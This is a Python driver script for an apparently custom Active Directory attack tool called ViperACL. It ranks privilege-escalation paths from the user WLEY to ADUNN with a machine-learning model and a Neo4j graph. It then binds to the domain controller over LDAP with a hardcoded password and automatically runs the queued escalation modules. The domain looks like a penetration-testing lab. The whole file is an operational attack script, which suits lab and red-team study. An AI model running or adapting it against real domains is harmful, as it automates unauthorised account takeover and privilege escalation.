import sys
import os
import joblib
import logging
# This forces Python to add your root ViperACL folder to its search path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.database import DatabaseManager
from core.pathfinder.pathfinder import PathfinderCoordinator
from core.privesc.engine import PrivescEngine
from core.privesc.state_context import SessionContext
from ldap3 import Server, Connection, ALL


logging.basicConfig(level=logging.INFO, format="%(message)s")

# CONFIGURATION
DC_IP = "172.16.5.5"
DOMAIN = "INLANEFREIGHT.LOCAL"
SOURCE_USER = "INLANEFREIGHT\\WLEY"
SOURCE_PASS = "transporter@4"

# 1. Find the Path (Neo4j)
db = DatabaseManager()
db.connect()
pf = PathfinderCoordinator(db)

model_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "models", "viper_rf_model.pkl")
rf_model = joblib.load(model_path)

ranked_paths = pf.find_path(
    "WLEY@INLANEFREIGHT.LOCAL",
    "ADUNN@INLANEFREIGHT.LOCAL",
    mode="predictive",
    ml_model=rf_model,
)

if not ranked_paths or len(ranked_paths) < 2:
    raise RuntimeError("Predictive mode did not return a rank2 path.")

rank2_path = ranked_paths[1]["path"]
rank2_score = ranked_paths[1]["success_probability"]

logging.info("[*] Selected predictive rank 2 path")
logging.info(f"[*] Success Probability: {rank2_score}%")

for i in range(0, len(rank2_path) - 2, 2):
    start_node = rank2_path[i]["name"]
    rel_type = rank2_path[i + 1]
    end_node = rank2_path[i + 2]["name"]
    logging.info(f"  {start_node} --[{rel_type}]--> {end_node}")

server = Server(DC_IP, use_ssl=True, get_info=None)
conn = Connection(server, user=SOURCE_USER, password=SOURCE_PASS, auto_bind=True)

# 2. Initialize the new privesc engine context
context = SessionContext(
    domain=DOMAIN,
    dc_ip=DC_IP,
    initial_user=SOURCE_USER,
    initial_password=SOURCE_PASS,
)
engine = PrivescEngine(conn=conn, domain=DOMAIN, dc_ip=DC_IP, context=context)

# 3. Build the execution plan from the discovered path
engine.build_plan([{"p": rank2_path}])

# 4. Run the queued modules
engine.execute_all()
